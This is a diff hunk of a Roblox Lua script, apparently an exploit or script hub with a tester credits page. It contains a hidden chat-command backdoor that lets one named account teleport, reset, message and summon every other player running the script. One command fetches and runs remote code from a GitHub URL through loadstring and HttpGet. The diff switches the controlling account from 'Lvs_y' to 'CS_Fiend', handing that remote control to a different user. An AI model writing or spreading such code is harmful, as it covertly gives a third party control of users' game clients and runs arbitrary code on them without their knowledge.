@@ -870,14 +870,14 @@ LabelCreds = PageCreds:CreateLabel("Tester: Lvs_y | INXANITTY | Mn9xr")
 LabelCreds = PageCreds:CreateLabel("NPC Dialog: ChatGPT")
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(H)
-    if H.FromSpeaker == "Lvs_y" and H.Message == ".rejoin" then
+    if H.FromSpeaker == "CS_Fiend" and H.Message == ".rejoin" then
         if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
             return
         end
         local placeId = game.PlaceId
         local jobId = game.JobId
         game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId, player)
-    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".reset" then
+    elseif H.FromSpeaker == "CS_Fiend" and H.Message == ".reset" then
         if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
             return
         end
@@ -888,7 +888,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             P.CharacterAdded:Wait()
             P.Character:WaitForChild("HumanoidRootPart").CFrame = Position
         end
-    elseif H.FromSpeaker == "Lvs_y" and H.Message:sub(1, 4) == ".say" then
+    elseif H.FromSpeaker == "CS_Fiend" and H.Message:sub(1, 4) == ".say" then
         local message = H.Message:sub(6)
         if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
             return
@@ -902,7 +902,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
         notigui.Visible = true
         wait(5)
         notigui.Visible = false
-    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".come" then
+    elseif H.FromSpeaker == "CS_Fiend" and H.Message == ".come" then
         local userrr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
         local hotrobloxfemboydev = game.Workspace.Lvs_y.HumanoidRootPart
         userrr.CFrame = hotrobloxfemboydev.CFrame
@@ -946,7 +946,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             return
         end
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/Fun/main/Execute%20Test"))()
-    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".reexecute" then
+    elseif H.FromSpeaker == "CS_Fiend" and H.Message == ".reexecute" then
         if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
             return
         end
